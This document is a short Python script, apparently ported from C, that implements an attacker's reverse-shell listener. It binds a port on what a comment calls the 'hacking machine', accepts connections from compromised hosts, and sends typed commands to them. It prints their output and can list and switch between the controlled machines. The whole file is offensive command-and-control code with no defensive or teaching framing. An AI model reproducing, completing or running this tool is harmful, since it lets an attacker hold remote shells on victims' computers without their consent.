import socket
import threading

def bzero(p, size):
    return bytearray(size)

def handle_client(client_sock, client_address):
    while True:
        buffer = bytearray(1024)
        response = bytearray(18384)
        
        print(f"* Shell#{client_address[0]}~$: ", end="")
        buffer_input = input()
        buffer[:len(buffer_input)] = buffer_input.encode('utf-8')
        
        client_sock.send(buffer)
        
        if buffer_input == "exit":
            client_sock.close()
            break
        elif buffer_input == "list":
            print("Connected clients:")
            for idx, addr in enumerate(client_addresses):
                print(f"{idx + 1}. {addr[0]}")
        elif buffer_input.startswith("switch "):
            client_index = int(buffer_input.split()[1]) - 1
            if 0 <= client_index < len(client_sockets):
                client_sock = client_sockets[client_index]
                client_address = client_addresses[client_index]
                print(f"Switched to control {client_address[0]}")
            else:
                print("Invalid client index")
        else:
            response_len = client_sock.recv_into(response)
            print(response[:response_len].decode('utf-8'))

    client_sockets.remove(client_sock)
    client_addresses.remove(client_address)

def main():
    global client_sockets, client_addresses
    client_sockets = []
    client_addresses = []

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    optval = 1
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, optval)
    
    server_address = (' ', 50004)  # Insert hacking machine IP here
    sock.bind(server_address)
    sock.listen(5)
    
    while True:
        client_sock, client_address = sock.accept()
        client_sockets.append(client_sock)
        client_addresses.append(client_address)
        
        client_thread = threading.Thread(target=handle_client, args=(client_sock, client_address))
        client_thread.start()

if __name__ == "__main__":
    main()
